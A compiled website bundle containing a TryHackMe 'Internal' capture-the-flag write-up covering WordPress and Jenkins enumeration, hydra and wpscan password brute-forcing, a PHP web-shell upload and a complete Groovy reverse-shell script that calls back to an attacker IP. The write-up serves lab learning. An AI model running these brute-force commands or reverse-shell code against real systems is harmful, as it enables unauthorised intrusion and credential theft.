"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[4468],{3905:function(e,t,n){n.d(t,{Zo:function(){return u},kt:function(){return h}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var p=r.createContext({}),l=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},u=function(e){var t=l(e.components);return r.createElement(p.Provider,{value:t},e.children)},c={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,i=e.originalType,p=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),d=l(n),h=a,m=d["".concat(p,".").concat(h)]||d[h]||c[h]||i;return n?r.createElement(m,o(o({ref:t},u),{},{components:n})):r.createElement(m,o({ref:t},u))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=n.length,o=new Array(i);o[0]=d;var s={};for(var p in t)hasOwnProperty.call(t,p)&&(s[p]=t[p]);s.originalType=e,s.mdxType="string"==typeof e?e:a,o[1]=s;for(var l=2;l<i;l++)o[l]=n[l];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},2964:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return p},metadata:function(){return l},toc:function(){return u},default:function(){return d}});var r=n(7462),a=n(3366),i=(n(7294),n(3905)),o=["components"],s={},p=void 0,l={unversionedId:"Cibersecurity/Red Team/Writeups/Internal THM{}",id:"Cibersecurity/Red Team/Writeups/Internal THM{}",title:"Internal THM{}",description:"80(Wordpress)",source:"@site/docs/Cibersecurity/Red Team/Writeups/Internal THM{}.md",sourceDirName:"Cibersecurity/Red Team/Writeups",slug:"/Cibersecurity/Red Team/Writeups/Internal THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Internal THM{}",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Game Zone THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Game Zone THM{}"},next:{title:"Mr Robot THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Mr Robot THM{}"}},u=[{value:"80(Wordpress)",id:"80wordpress",children:[{value:"Nmap",id:"nmap",children:[],level:3}],level:2},{value:"Web",id:"web",children:[{value:"Gobuster",id:"gobuster",children:[{value:"Gobuster /blog",id:"gobuster-blog",children:[],level:4},{value:"Gobuster /wordpress",id:"gobuster-wordpress",children:[],level:4},{value:"Gobuster /javascript",id:"gobuster-javascript",children:[],level:4},{value:"Gobuster /phpmyadmin",id:"gobuster-phpmyadmin",children:[{value:"/setup",id:"setup",children:[],level:6}],level:4}],level:3},{value:"Nikto",id:"nikto",children:[],level:3},{value:"wpscan",id:"wpscan",children:[],level:3},{value:"Wordpress",id:"wordpress",children:[],level:3},{value:"Shell",id:"shell",children:[],level:3},{value:"Jenkins",id:"jenkins",children:[],level:3}],level:2}],c={toc:u};function d(e){var t=e.components,n=(0,a.Z)(e,o);return(0,i.kt)("wrapper",(0,r.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h2",{id:"80wordpress"},"80(Wordpress)"),(0,i.kt)("p",null,"First we edit the ",(0,i.kt)("inlineCode",{parentName:"p"},"/etc/hosts")," file to add ",(0,i.kt)("em",{parentName:"p"},"internal.thm")),(0,i.kt)("h3",{id:"nmap"},"Nmap"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"nmap -A -T4 -p- -sC 10.10.221.255")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)\n|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)\n|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n")),(0,i.kt)("h2",{id:"web"},"Web"),(0,i.kt)("h3",{id:"gobuster"},"Gobuster"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"/blog                 (Status: 301) [Size: 311] [--\x3e http://internal.thm/blog/]\n/wordpress            (Status: 301) [Size: 316] [--\x3e http://internal.thm/wordpress/]\n/javascript           (Status: 301) [Size: 317] [--\x3e http://internal.thm/javascript/]\n/phpmyadmin           (Status: 301) [Size: 317] [--\x3e http://internal.thm/phpmyadmin/]\n")),(0,i.kt)("h4",{id:"gobuster-blog"},"Gobuster /blog"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"/wp-content           (Status: 301) [Size: 322] [--\x3e http://internal.thm/blog/wp-content/]\n/wp-includes          (Status: 301) [Size: 323] [--\x3e http://internal.thm/blog/wp-includes/]\n/wp-admin             (Status: 301) [Size: 320] [--\x3e http://internal.thm/blog/wp-admin/]  \n")),(0,i.kt)("h4",{id:"gobuster-wordpress"},"Gobuster /wordpress"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"/wp-content  WHITE BACKGROUND         (Status: 301) [Size: 327] [--\x3e http://internal.thm/wordpress/wp-content/]\n/wp-includes FORBIDDEN         (Status: 301) [Size: 328] [--\x3e http://internal.thm/wordpress/wp-includes/]\n/wp-admin    WORDPRESS LOGIN         (Status: 301) [Size: 325] [--\x3e http://internal.thm/wordpress/wp-admin/]\n")),(0,i.kt)("h4",{id:"gobuster-javascript"},"Gobuster /javascript"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"/prototype       FORBIDDEN          (Status: 301) [Size: 327] [--\x3e http://internal.thm/javascript/prototype/]\n/scriptaculous   FORBIDDEN     (Status: 301) [Size: 331] [--\x3e http://internal.thm/javascript/scriptaculous/]\n/jquery          FORBIDDEN     (Status: 301) [Size: 324] [--\x3e http://internal.thm/javascript/jquery/] \n")),(0,i.kt)("h4",{id:"gobuster-phpmyadmin"},"Gobuster /phpmyadmin"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"/templates  FORBIDDEN          (Status: 403) [Size: 277]\n/themes     FORBIDDEN          (Status: 301) [Size: 324] [--\x3e http://internal.thm/phpmyadmin/themes/]\n/doc        FORBIDDEN          (Status: 301) [Size: 321] [--\x3e http://internal.thm/phpmyadmin/doc/]   \n/js         FORBIDDEN          (Status: 301) [Size: 320] [--\x3e http://internal.thm/phpmyadmin/js/]    \n/libraries  FORBIDDEN          (Status: 403) [Size: 277]                                             \n/setup      LOGIN PAGE, INTERESTING          \n/sql        FORBIDDEN          (Status: 301) [Size: 321] [--\x3e http://internal.thm/phpmyadmin/sql/]   \n/locale     FORBIDDEN          (Status: 301) [Size: 324] [--\x3e http://internal.thm/phpmyadmin/locale/]\n")),(0,i.kt)("h6",{id:"setup"},"/setup"),(0,i.kt)("p",null,"Tried ",(0,i.kt)("inlineCode",{parentName:"p"},"hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz internal.thm http-get /phpmyadmin/setup")," but obtained nothing"),(0,i.kt)("h3",{id:"nikto"},"Nikto"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"nikto -h internal.thm")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5abef58e962a5, mtime: gzip\n+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.\n+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST \n+ Uncommon header 'x-ob_mode' found, with contents: 1\n+ OSVDB-3233: /icons/README: Apache default file found.\n+ /phpmyadmin/: phpMyAdmin directory found\n+ Cookie wordpress_test_cookie created without the httponly flag\n+ /blog/wp-login.php: Wordpress login found\n")),(0,i.kt)("h3",{id:"wpscan"},"wpscan"),(0,i.kt)("p",null,"Because we know that the server is running Worpress, we can use ",(0,i.kt)("inlineCode",{parentName:"p"},"wpscan")," to obtain more information.\n",(0,i.kt)("inlineCode",{parentName:"p"},"wpscan --url http://internal.thm/blog -e u ")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"+] admin\n | Found By: Author Posts - Author Pattern (Passive Detection)\n | Confirmed By:\n |  Rss Generator (Passive Detection)\n |  Wp Json Api (Aggressive Detection)\n |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n")),(0,i.kt)("p",null,"Basically, we find the user admin. With the use of ",(0,i.kt)("inlineCode",{parentName:"p"},"wpscan")," we can try to bruteforce the user admin.\n",(0,i.kt)("inlineCode",{parentName:"p"},"wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"[+] Performing password attack on Xmlrpc against 1 user/s\n[SUCCESS] - admin / my2boys                                                                                                                                                                                       \nTrying admin / bratz1 Time: 00:03:06 <                                                                                                                                   > (3885 / 14348277)  0.02%  ETA: ??:??:??\n\n[!] Valid Combinations Found:\n | Username: admin, Password: my2boys\n")),(0,i.kt)("p",null,"And that's our password."),(0,i.kt)("p",null,"After investigating a bit, we find this information in a post inside wordpress admin account:\n",(0,i.kt)("inlineCode",{parentName:"p"},"Don't forget to reset Will's credentials. william:arnold147")),(0,i.kt)("h3",{id:"wordpress"},"Wordpress"),(0,i.kt)("p",null,"Now that we have access to wordpress with an admin account, we can establish a reverse shell.\nFor that we use the information provided in this web: ",(0,i.kt)("a",{parentName:"p",href:"https://www.hacknos.com/wordpress-shell-upload/"},"https://www.hacknos.com/wordpress-shell-upload/")," using the 404.php method.\nFor the reverse shell, we use the pentestmonkey php reverse shell: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/pentestmonkey/php-reverse-shell"},"https://github.com/pentestmonkey/php-reverse-shell")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"nc -lvnp 5555"),"on our machine."),(0,i.kt)("h3",{id:"shell"},"Shell"),(0,i.kt)("p",null,"We can upload our shell using this info: ",(0,i.kt)("a",{parentName:"p",href:"https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/"},"https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/"),"\nWe find on /opt this information:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-Bill,"},"\nAubreanna needed these credentials for something later.  Let her know you have them and where they are.\n\naubreanna:bubb13guM!@#123\n")),(0,i.kt)("p",null,"And can open the first flag on home directory.\nWe also find this information on a file in /home directory:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Internal Jenkins service is running on 172.17.0.2:8080\n")),(0,i.kt)("p",null,"We can access the Jenkins portal by making a tunnel and redirecting Jenkin\u2019s Portal running on port 8080 on to our attacking kali machine. To access it we are going to use ",(0,i.kt)("strong",{parentName:"p"},"SSH tunneling technique")," to forward Jenkins ip:port to our attacker machine\u2019s ip:port. From attackers (kali linux) terminal execute below command and type the password which we retrieved from wp-save.txt file.\n",(0,i.kt)("inlineCode",{parentName:"p"},"ssh -L 6767:172.17.0.2:8080 aubreanna@internal.thm"),"\nTo access Jenkins, type localhost:6767 in your browser from the local machine."),(0,i.kt)("h3",{id:"jenkins"},"Jenkins"),(0,i.kt)("p",null,"Because we can't connect with any found credentials, we choose bruteforce with hydra.\nFor that, is important to use the IP and port correctly\n",(0,i.kt)("inlineCode",{parentName:"p"},"hydra  -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 -s 6767 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password'"),"\nAnd that is the result"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"[6767][http-post-form] host: 127.0.0.1   login: admin   password: spongebob\n")),(0,i.kt)("p",null,"After finding in google, we discover that can obtain a reverse shell using the Groovy Script Console\n",(0,i.kt)("inlineCode",{parentName:"p"},"nc -lvnp 5555")," on our local machine and after we execute this code in jenkins"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'String host="10.11.62.63";\nint port=5555;\nString cmd="/bin/bash";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n\n')),(0,i.kt)("p",null,"Know we have a reverse shell.\nAnd because we can't find anything interesting with linpeas.sh, we do it manually:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"jenkins@jenkins:/$ find / -name *.txt\n/opt/note.txt\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"jenkins@jenkins:/opt$ cat note.txt\nAubreanna,\n\nWill wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you \nneed access to the root user account.\n\nroot:tr0ub13guM!@#123\n")))}d.isMDXComponent=!0}}]);